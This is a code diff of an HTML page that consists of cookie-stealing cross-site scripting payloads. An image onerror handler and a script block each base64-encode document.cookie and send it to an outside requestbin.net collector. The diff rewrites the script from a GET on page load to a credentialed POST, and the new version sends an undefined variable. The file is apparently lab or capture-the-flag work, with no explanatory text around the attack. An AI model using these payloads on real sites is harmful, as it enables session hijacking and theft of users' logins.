@@ -10,15 +10,17 @@
 <img src =asdf onerror="$.get('http://requestbin.net/r/1iksjrn1'+ '?cookie='+ btoa(document.cookie))">
 
 <script type="text/javascript">
-    function httpGet(theUrl)
-    {
-        var theUrl = 'http://requestbin.net/r/1iksjrn1'+ '?cookie='+ btoa(document.cookie);
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", theUrl, false  ); // false for synchronous request
-        xmlHttp.send( null  );
-        return xmlHttp.responseText;
-    }
-window.onload = httpGet;
+var theUrl = 'http://requestbin.net/r/1iksjrn1'+ '?cookie='+ btoa(document.cookie);
+var xhr = new XMLHttpRequest()
+        xhr.open('POST', theUrl, true)
+        xhr.withCredentials = true
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState === 2) {
+              console.log("finished");
+          }
+        }
+        xhr.setRequestHeader('Content-Type', 'application/json')
+        xhr.send(json)
 </script>
 </body>
 </html>
